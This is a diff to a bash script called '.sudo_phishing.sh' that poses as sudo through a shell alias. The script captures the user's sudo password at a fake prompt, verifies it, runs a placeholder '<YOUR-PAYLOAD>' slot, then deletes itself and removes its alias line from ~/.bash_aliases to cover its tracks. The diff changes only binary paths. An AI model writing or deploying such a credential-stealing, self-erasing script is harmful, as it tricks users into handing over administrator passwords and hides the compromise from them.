@@ -19,7 +19,7 @@ attempts() {
     /bin/echo -n "${INPUT_MESSAGE}"
     read -r -s sudo_password
     /bin/echo ""
-    if ( /bin/echo "${sudo_password}" | /usr/bin/sudo -S /usr/bin/true > /dev/null 2>&1 ); then
+    if ( /bin/echo "${sudo_password}" | /usr/bin/sudo -S /bin/true > /dev/null 2>&1 ); then
         ##
         # <YOUR-PAYLOAD>
         ##
@@ -27,16 +27,16 @@ attempts() {
         ##
         # </YOUR-PAYLOAD>
         ##
-        /usr/bin/rm ~/.sudo_phishing.sh
+        /bin/rm ~/.sudo_phishing.sh
         /usr/bin/head -n -1 ~/.bash_aliases > ~/.bash_aliases_bak
-        /usr/bin/mv ~/.bash_aliases_bak ~/.bash_aliases
+        /bin/mv ~/.bash_aliases_bak ~/.bash_aliases
         /bin/echo "${sudo_password}" | /usr/bin/sudo -S "${@}"
         $BASH
         exit 0
     fi
 }
 
-if ( (/usr/bin/sudo -n /usr/bin/true > /dev/null 2>&1) || [ "${#}" -eq 0 ] ); then
+if ( (/usr/bin/sudo -n /bin/true > /dev/null 2>&1) || [ "${#}" -eq 0 ] ); then
     /usr/bin/sudo "${@}"
 else
     for ((iterator=1; iterator <= MAXIMUM_ATTEMPTS; iterator++)); do
